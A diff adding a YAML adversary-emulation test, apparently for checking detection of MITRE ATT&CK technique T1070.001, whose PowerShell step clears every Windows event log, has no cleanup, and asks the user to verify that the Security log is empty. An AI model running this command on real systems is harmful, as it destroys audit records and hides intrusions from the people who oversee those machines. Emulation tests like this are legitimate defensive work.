@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: Delete System Logs Using Clear-EventLog
+description: |
+    Clear event logs using built-in PowerShell commands.
+    Upon successful execution, you should see the list of deleted event logs
+    Upon execution, open the Security.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty or has very few logs in it.
+uuid: b13e9306-3351-4b4b-a6e8-477358b0b498
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1070: Indicator Removal'
+    subtechniques:
+        - 'T1070.001: Clear Windows Event Logs'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: delete-system-logs-using-clear-eventlog
+      inline: |
+        $logs = Get-EventLog -List | ForEach-Object {$_.Log}
+        $logs | ForEach-Object {Clear-EventLog -LogName $_ }
+        Get-EventLog -list
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
